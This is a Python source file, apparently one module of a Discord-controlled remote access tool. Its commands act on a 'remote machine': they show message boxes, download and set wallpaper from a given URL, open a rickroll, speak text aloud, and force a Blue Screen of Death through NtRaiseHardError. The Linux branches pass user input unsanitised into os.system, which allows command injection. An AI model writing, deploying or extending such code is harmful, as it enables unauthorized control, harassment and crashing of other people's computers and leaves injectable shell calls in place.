import os
import ctypes
import threading
import discord
from discord.ext import commands
import webbrowser
import requests
from src.client.core.platform import Platform

# For TTS
try:
    import pyttsx3
except ImportError:
    pass

class Fun(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="msg", help="Show a message box on the remote machine.")
    async def message_box(self, ctx, *, message):
        try:
            if Platform.is_windows():
                def show_box():
                    ctypes.windll.user32.MessageBoxW(0, message, "System Message", 0x40 | 0x1)
                threading.Thread(target=show_box).start()
                await ctx.send(f"✅ Message box shown: `{message}`")
            elif Platform.is_linux():
                # Try using zenity or notify-send on Linux
                os.system(f'notify-send "System Message" "{message}"')
                await ctx.send(f"✅ Notification sent: `{message}`")
            else:
                await ctx.send("❌ Message boxes not supported on this platform.")
        except Exception as e:
            await ctx.send(f"❌ Error showing message: {str(e)}")

    @commands.command(name="wallpaper", help="Change the desktop wallpaper from a URL.")
    async def change_wallpaper(self, ctx, url):
        try:
            await ctx.send("🖼️ Downloading and setting wallpaper...")
            response = requests.get(url)
            if response.status_code == 200:
                image_path = os.path.join(Platform.get_temp_path(), "wallpaper.jpg")
                with open(image_path, "wb") as f:
                    f.write(response.content)
                
                if Platform.is_windows():
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(image_path), 3)
                    await ctx.send("✅ Wallpaper changed (Windows).")
                elif Platform.is_linux():
                    # This varies by desktop environment (GNOME, KDE, etc.)
                    # Basic GNOME attempt:
                    os.system(f"gsettings set org.gnome.desktop.background picture-uri 'file://{os.path.abspath(image_path)}'")
                    await ctx.send("✅ Wallpaper change attempt sent (Linux GNOME).")
                else:
                    await ctx.send("❌ Wallpaper change not supported on this platform.")
            else:
                await ctx.send("❌ Failed to download image.")
        except Exception as e:
            await ctx.send(f"❌ Wallpaper Error: {str(e)}")

    @commands.command(name="rickroll", help="Open the RickRoll video on the remote machine.")
    async def rickroll(self, ctx):
        try:
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            await ctx.send("🕺 Rickrolled!")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

    @commands.command(name="speak", help="Make the remote machine speak text.")
    async def speak(self, ctx, *, text):
        try:
            def tts_thread():
                try:
                    import logging
                    import pyttsx3
                    engine = pyttsx3.init()
                    engine.say(text)
                    engine.runAndWait()
                except ImportError:
                    logging.error("[FUN] TTS Error: pyttsx3 not installed.")
                except Exception as e:
                    logging.error(f"[FUN] TTS Thread Error: {e}")
            
            threading.Thread(target=tts_thread, daemon=True).start()
            await ctx.send(f"🗣️ Speaking: `{text}`")
        except Exception as e:
            await ctx.send(f"❌ TTS Error: {str(e)}")
            self.bot.logger.error(f"TTS Error: {e}")

    @commands.command(name="bsod", help="Trigger a real Blue Screen of Death (Windows Admin only).")
    async def bsod(self, ctx):
        if not Platform.is_windows():
            await ctx.send("❌ BSOD only works on Windows.")
            return
            
        try:
            await ctx.send("💀 Triggering BSOD...")
            # Traditional NT BSOD trigger
            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except Exception as e:
            await ctx.send(f"❌ BSOD Error: {str(e)}")

async def setup(bot):
    await bot.add_cog(Fun(bot))
